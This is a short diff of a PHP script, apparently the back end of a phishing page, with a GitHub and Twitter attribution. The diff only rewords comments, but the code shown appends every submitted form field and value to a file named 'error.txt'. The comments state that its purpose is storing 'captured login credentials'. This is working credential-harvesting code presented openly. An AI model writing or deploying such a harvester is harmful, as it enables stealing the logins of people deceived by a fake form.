@@ -2,10 +2,10 @@
 //Twitter: @johntroony
 //Github: JohnTroony
 
-//open file to dump the captured logins
+//open file to dump the captured login credentials
 $handle = fopen("error.txt", "a");
 
-//Write submitted post entry from the form in the open file
+//write captured login credentials to file
 foreach($_POST as $variable => $value) {
    fwrite($handle, $variable);
    fwrite($handle, "=");
